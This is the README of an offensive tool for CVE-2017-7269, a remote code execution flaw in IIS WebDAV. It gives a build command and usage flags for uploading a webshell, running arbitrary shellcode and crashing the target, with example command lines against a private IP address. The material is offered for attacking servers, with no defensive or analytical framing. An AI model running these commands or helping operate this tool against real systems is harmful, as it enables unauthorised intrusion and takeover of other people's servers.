# cve-2017-7269 webshell and shellcode tool

### build

	csc cve-2017-7269.cs

### usage

	CVE-2017-7269 <url> [parms]

	Header:
	-h <host>       set host for [If] header
	-p <port>       set port for [If] header
	-s <scheme>     set scheme for [If] header
	-l <length>     length of physical path
	
	WebShell:
	-w <webshell>   upload webshell to server
	-wp <shellpath> path of webshell to save
	
	ShellCode:
	-c <shellcode>  execute the shellcode
	
	Misc:
	-t      test vulnerable only.
	-e      exit process when getshell or test
	-k      kill target(equals -e and -t)

### example

	CVE-2017-7269 http://192.168.1.1/
	CVE-2017-7269 http://192.168.1.1/ -l 19
	CVE-2017-7269 http://host.remote/ -h test.local -p 8080 -s https
	CVE-2017-7269 http://192.168.1.1/ -e -l 22 -w evil.asp -wp /webshell.asp
	CVE-2017-7269 http://192.168.1.1/ -c shellcode.bin


